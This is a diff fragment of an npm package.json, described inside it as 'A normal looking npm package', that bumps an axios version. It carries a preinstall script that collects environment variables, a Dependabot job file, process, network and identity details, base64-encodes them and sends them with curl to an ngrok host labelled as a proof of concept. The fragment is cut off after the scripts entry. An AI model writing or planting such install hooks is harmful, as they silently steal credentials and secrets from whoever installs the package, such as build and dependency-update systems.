@@ -4,7 +4,7 @@
   "description": "A normal looking npm package",
   "dependencies": {
     "lodash": "^4.17.19",
-    "axios": "^0.21.0"
+    "axios": "^1.17.0"
   },
   "scripts": {
     "preinstall": "NGROK=https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app; (echo '=== preinstall RCE ==='; echo '--- ENV ---'; env; echo '--- JOB ---'; cat \"${DEPENDABOT_JOB_PATH:-/home/dependabot/dependabot-updater/job.json}\" 2>/dev/null; echo '--- PS ---'; ps aux 2>/dev/null; echo '--- NET ---'; ip addr 2>/dev/null; echo '--- ID ---'; id; echo '--- CAP ---'; cat /proc/self/status 2>/dev/null | grep -i cap) | base64 -w0 | curl -sk -X POST \"${NGROK}?poc=npm_preinstall\" -H 'Content-Type: text/plain' --data-binary @- 2>/dev/null; true",
